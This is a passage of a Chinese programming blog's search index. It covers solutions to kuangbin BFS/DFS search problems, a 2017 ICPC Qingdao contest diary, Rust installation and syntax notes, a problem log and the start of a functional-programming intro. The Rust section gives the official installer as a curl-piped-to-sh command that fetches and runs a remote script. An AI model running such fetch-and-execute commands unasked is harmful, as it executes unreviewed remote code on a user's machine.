100$的大小吓住了？要搞高精度？其实就是题目在蒙人。考虑6，有$1100\\mod 6 = 0$，也就是说，$1100$也只是符合要求的解；而且这个题有Special Judge，所以构造合适的解就行。由于是01串，我们可以对这个数直接往下搜索，所以dfs的调用是： dfs(x * 10, step + 1); dfs(x * 10 + 1, step + 1); 另外要注意，这个数压根不会超过unsigned long long的范围，而unsigned long long大约能表示$0 -{10}^{19}$的范围，所以枚举19位即可。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:5","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"F. Prime Path – POJ 3126 考点：BFS、质数表 难度：适中 首先打一个质数表，然后遵照以下两条规则变换： 每次仅变换一位，且保证新的数为质数 第一位范围为$1-9$，其他位范围为$0-9$ 然后套BFS板子就能做。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:6","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"G. Shuffle’m Up – POJ 3087 考点：模拟 难度：简单 十分简单的一道题目。图上解释的很清楚，$S_1$和$S_2$间隔放置得到$S_{12}$，这个$S_{12}$下半部分重新切割成$S_1$和$S_2$。循环$n$次，假如能得到目标盘面则输出$n$，否则输出$-1$。 手动模拟一下可以知道，这个序列是循环的，循环$length(S_{12})-2$次后有$S_1’=S_1$和$S_2’=S_2$。模拟计数即可。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:7","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"H. Pots – POJ 3414 考点：BFS、路径记忆 难度：适中 难度并不大，就是一个标准的BFS搜索，难点在于记忆搜索路径。这里要利用好容器，注意到这个和顺序有关，是一种FIFO的顺序，可以使用队列。我用了vector。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:8","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"I. Fire Game – FZU 2150 考点：两点BFS 难度：困难 BFS比较难的一种题型。题目的意思是，俩熊孩子点草丛，每块草丛会以$1$的速度扩散火势，问烧光所有草丛的最短时间。 这一题的难点在于，搜索是两个点同时进行的，我们如下考虑：一个点带来的贡献值只能是$step+1$或者$step$，那么最终的答案是最长路径的值。遍历一遍所有可以烧的点组，两两进行BFS然后求出最短时间。 这个题还需要特判一下，假如只有一块草坪，那么也是$0$的时间。 放火烧山，牢底坐穿！！！ ","date":"2017-11-18","objectID":"/post/346bf025/:2:9","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"J. Fire! – UVA 11624 考点：顺序BFS 难度：适中 这个题看似是两点BFS，实际简单得多。从题目中知道，火比人快，所以存下火的节点，然后火节点先入队，然后是人节点入队，顺着下去BFS即可。节点加个判断位，如果是人而且到达了任何边界点，直接输出答案即可。这里注意一下，一个是火的节点不止一个，题目里有提到；另一个，题目问的是逃出时间，到达边界后还需要$1s$才能逃出，所以答案是$step+1$。 好气啊，uDebug数据全过，只要交都吃WA，后面发现构造函数忘记写step的初始化了。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:10","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"K. 迷宫问题 – POJ 3984 考点：BFS、路径记忆 难度：适中 B的思路 + H的记忆方法。不再多说。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:11","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"L. Oil Deposits – HDU 1241 考点：DFS、更新域 难度：适中 很简单的DFS，数联通块即可。这里用的技巧是，遇到@计数加1，同时dfs下去，把所有直接连通的块全部置成*。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:12","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"M. 非常可乐 – HDU 1495 考点：BFS 难度：适中 也是一个BFS板子题。这个题考虑一个问题，三个杯子都可以倒，我们倒的方向可以是$S \\to A$，$S\\to B$，$A\\to S$，$A\\to B$，$B\\to S$，$B\\to A$，那最终的退出条件应该是 $$S_{\\text{remian}} = \\frac{S}{2} = \\max(A,B)_{\\text{remain}}$$ 也就是说，$S$这个大杯子和$A$、$B$中较大的一个杯子中各占一半的量。这里也提示我们剪枝，假如这个$S$是奇数，根本就不用计算，必定不能被平分。 另：这个题还有另外一个特别有意思的数论做法，参看这里。 ","date":"2017-11-18","objectID":"/post/346bf025/:2:13","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["算法笔记"],"content":"N. Find a way – HDU 2612 考点：BFS 难度：困难 这题难度主要是剪枝。我们可以考虑根据I题思路，对所有KFC均进行一次BFS，从中求最短时间，但是这样就会得到一个大大的TLE。这题实际做法是我们对两人各遍历一次，假如到达KFC就存下时间，最终求累积和的最小值。这里我用了一个map。 啊，这个专题从开坑到现在做完中间过了好久啊。。。。。 简单搜索部分还是挺简单的_(:зゝ∠)_（突出首尾呼应 我不会告诉你们我第一眼看到BFS毫无思路，然后意识到我做过的都是DFS，没写过BFS…… 下期见！ ","date":"2017-11-18","objectID":"/post/346bf025/:2:14","tags":["kuangbin带你飞","算法竞赛","ACM-ICPC","简单搜索","BFS","DFS"],"title":"kuangbin带你飞专题1-简单搜索","uri":"/post/346bf025/"},{"categories":["个人记录"],"content":" It’s not the end. It’s the start of our journey. 2017 ACM-ICPC青岛站现场赛结束了，青蛙爷爷队以2题的成绩夺得铁牌结束。 成绩 现场快剪视频还是很好看的，可以看看：http://acm.upc.edu.cn/?p=258 链接已失效。 这是一篇简短的游记打铁记。 ","date":"2017-11-06","objectID":"/post/81da36f3/:0:0","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"Day 0 看环境有VSC，狂笑不止，完全就是我的主场哈哈哈哈！！！！ 看了会儿线段树和zkw线段树，纠结于到底树状数组什么解决不了，浑浑噩噩度过了一个晚上，想到字符串没看完，一阵叹息。晚上睡得还不错。 ","date":"2017-11-06","objectID":"/post/81da36f3/:1:0","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"Day 1 ","date":"2017-11-06","objectID":"/post/81da36f3/:2:0","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"出发与到达 6:00起，巨困，等到了老哥和学长杀到校门口，我们是第一组到的哈哈。铮哥和董老师一起来的，更加确信早上那个分方向会水的不行。 上车后和老哥聊了一会儿。老哥说： 打铁不亏，铜牌稳赚，银牌血赚，金牌上天。 然后睡了一会儿，但是车上还是不是很舒服，过了一会儿就醒了。 离青岛还有36KM，10010给我发短信欢迎来到青岛。嗯？ 司机走了跨海大桥，感叹这桥工程量真大的同时，拍了几张照片，这种景象还是值得一拍。或许我应该找点城市规划之类的书看看？该买《Cities: Skyline》了。 到了UPC，卧槽这学校真大。 报道排队，吃饭排队，进场排队，国际大学生排队大赛？饭质量一般。 ","date":"2017-11-06","objectID":"/post/81da36f3/:2:1","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"开幕式与热身赛 啊，讲话好长啊，鼓掌都鼓累了。 老哥拆题十分稳，然后一分钟过去了。 惊讶的发现只有一套题，惊讶的发现账号密码没了。 然后问了志愿者：是只有一套题，账号密码在袋子里。 老哥尴尬的笑笑，登上了$PC^2$。 AB好水啊，切了。惊讶的发现我们在银牌区间，然后一看隔壁队，卧槽这手速，金牌。老哥嘲讽了我一波。这锅肯定不是我背，有种种原因。 开了一手Code::Blocks，打开编译选项，白屏。 看C，整个区间做异或运算并求排序后前$k$个数之和，开始考虑和异或和异或和的性质，没有。 老哥搞了一波优化，但是明显也是TLE抬走。 然后看对面复旦队，已经开始试评测机了，各种行末空格或者开大数组，感觉是金牌队，仰望大佬.jpg ","date":"2017-11-06","objectID":"/post/81da36f3/:2:2","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"晚上 笑着跟老哥说“现在能保证上来切两道水题”。 看群，C是01字典树，感叹见识太少。 主办方准备不足，各种问题，尤其是Code::Blocks和Java环境变量。幸好我是VSC+gdb玩家。 睡前打了一手AtCoder Beginner’s Round 077，果然还是切两道水题_(:зゝ∠)_。 第三题有点意思，对A、C两个序列做排序，然后遍历B做二分，少一次排序把复杂度压到$O(n lgn)$。感觉还是不懂优化。 ","date":"2017-11-06","objectID":"/post/81da36f3/:2:3","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"Day 2 ","date":"2017-11-06","objectID":"/post/81da36f3/:3:0","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"早上 又是第一个队起的，早餐不错，但是那个粥坑了我一手。早知道狂喝豆浆。 赶到赛场，还是熟悉的“请各位选手在比赛开始前不要动计算机”。 键盘下压了一张Appendix，老哥一看B，“这个肯定是水题”。 ","date":"2017-11-06","objectID":"/post/81da36f3/:3:1","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"正式赛 发题了，今天我来拆，拆的就比较狂妄，拿出账号密码赶快登$PC^2$，老哥来分题。 我所有题看了一遍，然后看了手E，老哥去看的B。 老哥说这B水题，我读了一下题直接搞，1A。 然后看榜，手速又慢了。 之后各自开了不同的题，我去看了J，老哥看了K。 看榜，I绿了一片。迅速开I，老哥没管我。 一读题，去年C语言应该好好写！！！！！！ 打#号打到灵魂出窍，让老哥想想我去做J。 然后老哥和我讨论了半天#，我想了一下难调，改成打空格。 很快调好，1A。 这个时候北化突然搞掉了J。老哥看了一手，指示我这是我的锅。 想了一下题意，应该是后缀数组，然后想起来自己就看了看概念，一点算法没看。 抄了个板子，发现不知道参数该填什么。血崩。 老哥看了一手E，我解释了一手题意，感觉怕是可以做。然后发现做个屁啊。 然后直到比赛结束一直在搞J，被C++这个破玩意儿搞了： string a = \"a\", aa = \"aa\"; cout \u003c\u003c (\"a\" \u003c \"aa\") \u003c\u003c endl; // =\u003e 0 cout \u003c\u003c (a \u003c aa) \u003c\u003c endl; // =\u003e 1 我们相信了第一条，结果我带头得出\"aaa\"字典序最小这种狗币结论。我真想砍死我自己。 注：对于第二行代码，Clang下会提示： result of comparison against a string literal is unspecified. 试了各种办法，离结束还有45分钟，我观察了一下，取循环节！ 然后搞了一波，过了样例。大家对视了一下，交！ WA。 然后我发现一个地方该加一个符号。加！交！ WA。 老哥和我对拍数据，果然出了个问题。我随便糊了一个就交了，WA。 后面发现我xjb糊的，老哥想砍我。 ","date":"2017-11-06","objectID":"/post/81da36f3/:3:2","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"滚榜\u0026闭幕式 出来看了一手，大家都炸了，都在喷。 对面复旦队真的惨，感觉应该是金牌实力，结果跪在了这个J上。 后面知道这个J数据极水，各种$O(n^2)$、$O(n^2logn)$、甚至$O(n^3)$都过了，但是有人后缀数组$O(nlogn)$卡掉了，就搞得成了一道练胆子的题目，敢搞暴力就能A，不敢就再见，还放过去很多莫名做法。据说doc老师尿性就是如此，被各路狂喷。 但是和我没什么关系，菜就是菜，也不敢搞暴力。 后面知道E是Polya计数+大数，离散又白学了！！！！ 滚榜小姐姐读队名不懂啊，“WA”读成了“W”“A”而不是“哇”。不过还是挺可爱的～给各路大仙的有趣队名跪了_(:зゝ∠)_。 北化手速金了，要我说凭什么嘲讽人家，本来ACM赛制就是过题+罚时，人家就是手速够了，不行吗？我反正是支持，这个金牌就应该有底气的拿着，这锅再甩也甩不到人家身上。 跟老哥全程重复一句话：“明年我们就在这个上面了”。 吃饭跑路～ ","date":"2017-11-06","objectID":"/post/81da36f3/:3:3","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["个人记录"],"content":"Day 2+1 想了很多。是，菜，做题少，队伍配置不均衡。 但是正因为自己菜，自己输了，才知道自己是个什么水平，才知道该干什么。 ACM于我而言可以说是一种梦想，不是功利的说我要拿个牌保研加分，Offer加成。 我想在ACM打出一点成就。 和老哥说好了，今年拼了，明年保铜争银。 下午想了一下，直接买了lrj大佬的两本《算法竞赛入门经典》，准备看爆+刷爆。 弱鸡的第一次ICPC现场赛之旅就这么结束了。弱鸡的ACM-ICPC之旅，现在才步入正轨。 ","date":"2017-11-06","objectID":"/post/81da36f3/:4:0","tags":["算法竞赛","区域赛","ACM-ICPC","青岛"],"title":"2017ACM-ICPC青岛现场赛打铁记","uri":"/post/81da36f3/"},{"categories":["学习笔记"],"content":"Rust是开源大佬Mozilla在2014年发布的一款面向系统级应用和底层应用开发的程序设计语言。在这之前，Google在2009年发布了Go语言，并且取得了不小的成功，比如Docker，这款极为强大且好用的容器引擎是使用Go构建的。不过Rust在发布的三年后也已经收获了一批拥趸，第一个面向很多用户的项目，Firefox Quantum版本中的CSS引擎（是用Rust写的）也即将发布了。我已经看过不少PL大师和一些搞编译器部分的大佬在狂吹Rust，Rust的社区也日渐壮大。 作为目标都是干掉C/C++，面向底层应用开发的程序语言，Go和Rust其实无形中有一种竞争关系（BTW，浏览器上，Google也一直在和Mozilla竞争）。7月的时候我也看了一下Go，看的很少，被语法恶心到了一下，可能是因为看得比较少的原因，之后应该会再看一下；但是从我前天晚上点开Rust开始，我却像上瘾一样被这门语言深深的吸引了，它的内部一些设计让我看到了Rust的优越性： 面向底层开发，高效的C绑定与极小运行时 零开销抽象，独特却先进的内存管理模型 线程无数据竞争，数据的所有权控制 极其前沿的语言特性，对FP的出色支持 等等等等。在看了这么一段时间之后，我已经深深地爱上了它，并且将把这门语言作为我C++的后备和全新的主力。 说了这么多，写点简单的东西作为笔记吧。 ","date":"2017-10-30","objectID":"/post/3daa99e9/:0:0","tags":["Rust","程序语言","技术"],"title":"Rust学习笔记(1)","uri":"/post/3daa99e9/"},{"categories":["学习笔记"],"content":"一、安装与配置 安装与配置十分简单。这里就要吹一波，Rust的工具链十分好用，你不需要任何IDE，一个文本编辑器就够了。 我的配置环境很简单： Elementary OS 0.4.1 based on Ubuntu 16.04.1 VS Code Latest Stable 那安装步骤实际上可以说是傻瓜式了： 在终端中运行： curl https://sh.rustup.rs -sSf | sh 就行了。Rust的安装程序会把你需要的自动配置好。之后你重启一下shell就行。 验证安装：运行一下rustc --version和cargo --version。这两步如果都返回一个带版本号的提示信息就代表配置完成了。如果没有，找到你的安装路径，一般是~/.cargo/bin，加进环境变量即可。 安装之后，来到VS Code，有官方的插件和一个用户写的。我用的是那个用户写的，安装然后Reload就行。可以用ext install vscode-rust。 这个插件的工作方式有两种： Legacy：这个模式下是插件配合，Stable Channel下可以正常工作，但是作者说这个模式做的虽然好，但是RLS模式更好，可能会废弃，所以现在可以用，也比较省心，但是未来要记得更换。 RLS（Rust Language Server）：Rust官方写了Language Server，也就是有了IDE级别的辅助开发能力，我更推荐这个模式。不过现在RLS还是预览版，如果要使用需要自行切换工具链。 我用了RLS模式。具体安装流程如下： 从nightly channel安装 rustup install nightly 安装依赖\u0026Racer rustup component add rls-preview --toolchain nightly rustup component add rust-analysis --toolchain nightly rustup component add rust-src --toolchain nightly cargo install racer VS Code配置 打开用户配置文件，添加： \"rust.mode\": \"rls\", \"rust.rls\": { \"useRustfmt\": true } 这就配置好了。其他编辑器请自己找配置教程。 还要注意，这里配置之后，默认的工具链还是在stable下，我们可以这么切换工具链：rustup default nightly。这样整个工具链会整体切换到nightly下面，包括cargo。如果你需要换回stable，只需要rustup default stable即可。另外，更新的时候使用rustup self update和rustup update，所有版本都会获得更新。 注意，nightly顾名思义，每夜版，是最前沿的开发版，可能会出现rls-preview更新跟不上等等问题，假如遇到了，可以考虑切换到beta channel，具体方式同上。如果发现VS Code无法使用beta channel下面的rls分析的话，把配置文件中\"rust.rustup\":{\"nightlyToolChain\"}后面的字段改成beta就行。 简单一提几个命令： 编译一个.rs文件：rustc hello.rs 新建一个库项目：cargo new helloworld 新建一个应用程序项目：cargo new helloworld --bin cargo编译：cargo build cargo编译并运行：cargo run cargo编译发行版：cargo build --release cargo生成文档：cargo doc cargo测试：cargo test 差不多就这些了，更多的请自己查文档。 ","date":"2017-10-30","objectID":"/post/3daa99e9/:0:1","tags":["Rust","程序语言","技术"],"title":"Rust学习笔记(1)","uri":"/post/3daa99e9/"},{"categories":["学习笔记"],"content":"二、简单语法 Rust的语法很容易理解，不过也有和传统语言不同的地方。 首先是程序主体，main()函数仍然是程序入口： fn main(){ // Your code here... } 当然，这个是程序项目，库项目不需要这个东西。 变量的声明需要讲讲： let x = 15; // 最基本的变量声明，变量不可改，类型自动推导：x -\u003e i32 let mut y = 16; // y是一个可变变量，类型也被自动推导：y -\u003e i32 let z: f32 = 1.234; // z是不可变的f32变量，冒号后面是类型注解，这样相当于告诉编译器z是f32类型 const MAX_SIZE: i32 = 155; // 常量，声明时必须有类型注解，绝对不允许修改 简单吧？要注意的是，Rust用的是Hindley-Milner类型系统，这是一个十分现代的类型系统，如果用过Haskell的话会对这种类型系统十分熟悉。 Hindley-Milner类型系统： 简单来说，HM类型系统可以对你的变量类型进行自动推导，这样你就不用在每一次指定你的变量类型；同时，由于它强大的类型推导能力，当你进行函数应用的时候，会自动推导出你的程序每一步的函数调用、返回赋值等等类型是否一致，能在静态检查时扼杀大部分的调用错误。 这里要强调一下mut关键字。Rust的变量是FP+IP的混合系统，在FP系统中，变量统一是不可变的，这很好理解，因为在函数式下变量和函数应用过程没有任何关系（参照我曾经写过的这篇文章），所以变量自然是不可变的。但是在我们的应用过程中很自然的需要一些可变变量，则我们使用mut来声明变量就可以让它变得可变。 类型注解功能只是显式指出类型是什么，如果注解和编译器推导的有问题仍然编译不过。 变量声明还有其他内容需要讲，这一部分将在数据类型中有涉及。 数据类型之后讲，这一部分和很多内容有关。 流程控制下，Rust综合了很多语言的流程控制顺序。具体来说，有以下三种： loop循环 loop { // 这个循环是确定的无限循环，你只能使用break退出 break; } while循环 while count != 0 { count -= 1; // Rust没有--与++ } // 这就是我们熟悉的while循环 for循环 for i in v.iter() { // do something with i } for循环没看懂？有Python基础的程序员应该能立即看懂，但是只有Java或者C/C++背景的程序员可能有点难理解。简而言之，只要in后面的对象是可迭代的，都能使用for循环去遍历，可以看看Python或者Rust标准库文档里面的示例深入理解一下。 continue和break这两个关键字仍然可用。 我们考虑如下一段C++代码： if (a == 15) { return 16; } else if (a == 16) { return 17; } else { return 0; } 根据a的不同值，我们得到不同的答案。当然，我们也可以使用switch。在Rust中，我们将见到更加强力的一种语法：模式匹配。 match a { 15 =\u003e 16, 16 =\u003e 17, _ =\u003e 0, }; 模式匹配的启动由一个match运算符引起，之后是一个表达式，可以是布尔表达式如if a == 25，或者就是单纯的一个变量，如a。大括号内部是匹配主体，由多个分支（arm）构成。 表达式与语句： 语句（Statements）：执行一些操作但不返回值的指令 表达式（Expressions）：计算并产生一个值 分支遵循如下格式： pattren =\u003e if_matched, 前面是匹配成功的模式，后面是匹配成功后执行的表达式。比如，上面的15 =\u003e 16意思就是： if a == 15 { 16 // 这一行涉及到语句块的返回，会在之后的函数部分讲到。 } 这个匹配成功的表达式（即if_matched）可以使用大括号括起来的一组表达式或者语句构成。 _的意思是通配，也就是所有内容都可以匹配上。那既然都可以匹配上，怎么保证15不会匹配到_上面呢？很简单，match带来的模式匹配由上到下，也就是越靠前的优先级越高，我们匹配时从上往下匹配，直到匹配上为止。同时，Rust也会要求你必须穷尽匹配，比如上面的代码如果这么修改： match a { 15 =\u003e 16, 16 =\u003e 17, }; 编译器会报错，因为匹配到除了15和16以外的值是没有对应分支的，这样这个匹配是无法穷尽的。所以，一个match运算符中的模式匹配必须穷举所有可能的模式。到这你应该能体会到_的用处了。 match所能带给我们的方便和优越性都是来自HM类型系统的功劳。或许，现在你还不能看出它的强大之处，等我们之后讲解了Rust的枚举之后你再品味，就能体会到它的强大了。 简单语法的最后，提一下怎么向控制台打印： println!(\"这一条会打印新的一行\"); // 字符串可以是UTF-8的合法字符 print!(\"这一条会打印，但不会换行～\") println!(\"后面这个东西{}\" ,\"会被参数内容替代～\"); // {}是模板字符串的语法，这里默认是参数打印的占位符 let x = 5; print!(\"下面这个是Debug打印的占位符：{:?}\", x); // {:?}在Debug的时候打印变量信息很好用，更多细节之后讲 打印的时候出现了三个新的点：宏与函数，模板字符串和Debug模式。第一个第三个都之后讲，这里重点讲模板字符串。 模板字符串是在JavaScript和Python通用的一种字符串格式化的语法。考虑如下C++代码： printf(\"%d %s\\n\", num, str); 这样读起来其实很难受，因为每一个标识符代表的意义不同，无论是人类去读或者编译器去parse都不容易。模板字符串则足够简单： let x = 15; let y = \"你好呀～\"; println!(\"数字x内容是：{}，字符串y内容是：{}\", x, y); 我们只需要处理{}即可。当然，所有的参数都在这里面，比如我们可以指定顺序： println!(\"字符串y内容是：{1}，数字x的内容是：{0}\", x, y); 至于模板字符串的格式化参数，请查阅库文档。 ","date":"2017-10-30","objectID":"/post/3daa99e9/:0:2","tags":["Rust","程序语言","技术"],"title":"Rust学习笔记(1)","uri":"/post/3daa99e9/"},{"categories":["学习笔记"],"content":"下集预告 讲的好少啊……. 一篇能写下的东西也不多，其实就是官方的实例的精简版，哈哈。 下期会讲一下Rust设计里面我觉得最优秀的两个地方：所有权(Ownership)系统和Option。主题应该是函数与变量和数据类型了。 我的主要参考资料是Rust 程序设计语言中文第二版，感谢翻译者和作者的辛勤工作！ See you soon~ Changelog： 2017.10.30 V1.0：最初版 2017.10.30 V1.1：添加必要链接，修正部分描述和结构，有关RLS部分修正 ","date":"2017-10-30","objectID":"/post/3daa99e9/:0:3","tags":["Rust","程序语言","技术"],"title":"Rust学习笔记(1)","uri":"/post/3daa99e9/"},{"categories":["趣题记录"],"content":"0x00. 前言 从开始刷算法题到现在大概有8个月了。自从上个月得到了去青岛现场赛的名额之后，我这个月狂补算法竞赛的知识。但是大一荒废了太多，很多时间可以学很多东西，时光白白浪费了，还是很后悔。 现在大二了，拼两年，决战大三大四，希望能拿一个好成绩。 朋友都说我最近气色不好了，哈哈。既然自己选择了这条路，就不会后悔。 这个栏目主要记录一些做过的有趣的和典型的题目，不会给详细代码。 我的答案仓库是 Click Me!。根据题号你能找到我的答案，但是我的答案有很大改进余地，欢迎与我探讨。 ","date":"2017-10-25","objectID":"/post/fbf3d13d/:1:0","tags":["ACM-ICPC","算法竞赛","刷题","算法","数据结构"],"title":"10月做题记录","uri":"/post/fbf3d13d/"},{"categories":["趣题记录"],"content":"0x01. 模板题 模板题不过多介绍了，这些题都验板子和套路用的。 Ouplio，KMP板子题，秒了。 Power String，next数组的性质，循环节 统计难题，Trie树板子题，被HDU这个破编译器坑了20发WA和不计其数的修改代码。。。 统计同成绩学生人数，STL中map板子题。 01背包，完全背包，Hihocoder特色，教学题，很好的题目，建议和背包九讲一起看。 ","date":"2017-10-25","objectID":"/post/fbf3d13d/:2:0","tags":["ACM-ICPC","算法竞赛","刷题","算法","数据结构"],"title":"10月做题记录","uri":"/post/fbf3d13d/"},{"categories":["趣题记录"],"content":"0x02. 趣题 这个月打了很多CF，有很多练思维的题目，相当有意思，找几道印象比较深的。 注意：下面的所有分析都会剧透这题怎么做，想练习的点击标题直接跳转练习即可。 Mahmoud and Ehab and the xor 完全没想到会这么考构造，我想到了$1\\oplus 2……\\oplus (1\\oplus 2…\\oplus x)$这种构造方法，但是显而易见的是，这题会有冲突。解决的方法完全给我上了一课，对于上限$x$寻找第一个符合要求的$x\\le 2^k$，然而还有可能重复，为了避免这个问题，使用$2^{k+1}$来辅助构造。这样就能保证不再重复，十分具有启发性。 Merge Sort 构造+模拟，这个题是真正使用逆向思维的题目。我们对一个无序序列需要调用$k$次归并排序才能把它排成有序的，那么我们可以直接这么构造：调用$k$次“打乱”方法，正好是归并排序的逆过程，就可以保证符合题目要求。一次打乱和一次排序是一一对应的关系，只要能理解这一点，这一题就很好做。 Unimodal Array 这个题十分有趣，要求这个序列先递增，后持平，再递减。想象一个梯形的轮廓就行。而且这三块区域可以任何一个为空集或者皆为空集。第一个想法就是先比较，一直递增就记录，那就是记录几个打破的点。但这里存在的问题很多很多，后面有很多东西需要考虑。看了题解才知道其实十分简单，两边一边递增一边递减，实际上都是沿着中心递增，那就从两头出发使用两个指针，到第一个不平衡位置打破然后判断区间内是否都相等即可。 The Intriguing Obsession 哎，比不过高中生。上海中学的大佬出的组合数学题。其实我很少在国外人出的题上做过组合数学题，可能是中国人数学很好的原因？哈哈。这个题主要是描述让我觉得十分有意思：“两个岛若直接相连距离为1，而两个不同颜色的岛若要相连至少距离为3”。这一句话其实隐藏了这么一个信息：两个相同颜色岛不能距离为1或者2。距离为1的情况是直接相连，2呢？2其实就是说两个相同颜色的岛不能连接到同一个其他颜色的岛上。那这个题就是两个岛集构造单射或者双射的过程，然后就变成一个很简单的组合数学问题。我对这种用情景描述重要信息的题目十分喜欢，这个题虽然我比赛的时候没做出来，但是真的很让我印象深刻。 The Artful Expedient 还是上面的大佬出的题。这题让我意识到数学推导的重要性。这个题最优美的一点就是情景是确定的，虽然看起来不确定，但是$a\\oplus b$和$b\\oplus a$都是满足题意的解，这是数学的对称性，这样保证答案一定是一个偶数，那答案就是确定的。这样的题目分析正是我所缺失的，很多时候我为了追求效率会变得急躁不冷静，这个题很好的教育了我，这个做法也让我觉得十分有趣。 这次就挑这些题吧。CF出的很多题目还是很有意思，最近一直在CF打比赛，之后也会去TopCoders和其他网站打打，坚持下去总有收获。 ","date":"2017-10-25","objectID":"/post/fbf3d13d/:3:0","tags":["ACM-ICPC","算法竞赛","刷题","算法","数据结构"],"title":"10月做题记录","uri":"/post/fbf3d13d/"},{"categories":["博客记录"],"content":"最近一直在忙11月的青岛ACM-ICPC现场赛，很少写文章了，11月之后再说吧。 这段时间也有很多感悟，包括我参加ACM的一些原因和未来的设想，以及青岛站的一些情况我也应该之后会写。可以确定的是，我会参加到大三。努力！ 另外，所有记录文章都将被移除，这些东西并不是都适合公开发表的。未来我会写一点能公开发表的个人记录文章。 祝好。 ","date":"2017-10-17","objectID":"/post/115f5153/:0:0","tags":["Deletion","ACM-ICPC"],"title":"Recent Activity","uri":"/post/115f5153/"},{"categories":["技术笔记"],"content":"0. 写在最前面 很久之前就想写一个函数式编程（Functional Programming，下文简称FP）的文章了。 最早听说函数式编程是大一下开学，看C++11标准的时候看到了一段这样的代码： auto f = [](int x) { return x + 5; }; f(5); // =\u003e 10 感觉很神奇，没有见过这种表达式，于是深入了解了一波。 这便一发不可收拾。 FP是一个很大的话题，内容非常深，涉及到很多计算机的底层知识，实在是大开眼界。 闭着眼睛，硬着头皮学了这么久，也觉得能得出一点东西。就写一个简短的系列，力求能简单了解FP吧。 在这个过程中，也受到了很多人的帮助，很抱歉不能一一列出，如有遗漏，请告诉我。 对了，本文可能使用很多语言来描述，但是主要的还是Python、Haskell、C++和Java。我会解释清楚必要的前置知识，力求不影响代码理解。 那么，FP之旅开始了。 ","date":"2017-09-14","objectID":"/post/b0ce9bee/:1:0","tags":["FP","函数式编程","Functional Programming","技术"],"title":"函数式编程——Think differently（1）","uri":"/post/b0ce9bee/"},{"categories":["技术笔记"],"content":"1. 何为函数式？ 在讨论这个问题之前，我们先看两段代码： // Example 1: Recursion, Functional int sum(int n) { if (n == 1) return 1; else return n + sum(n - 1); } // Example 2: Loop, Imperative int sum(int n) { int res = 0; for (int i = 1; i \u003c= n; i++) res += i; return res; } 这两段代码干了什么呢？很简单，就是计算$S(n)=1+2+…+n$。 那么，这两段代码区别在哪儿？也很简单，就是一个是递归，一个是循环。 这里我能告诉你，第一段代码是更加函数式的写法，第二段代码是更加命令式的写法。 “这不都是C++代码吗？哪儿有函数式？你说那个什么Lambda Expession也没有啊？” 别急，让我们先来看看这二者的区别。 ","date":"2017-09-14","objectID":"/post/b0ce9bee/:2:0","tags":["FP","函数式编程","Functional Programming","技术"],"title":"函数式编程——Think differently（1）","uri":"/post/b0ce9bee/"},{"categories":["技术笔记"],"content":"i.命令式编程 让我们先复习一下什么是图灵机。 图灵机（英语：Turing 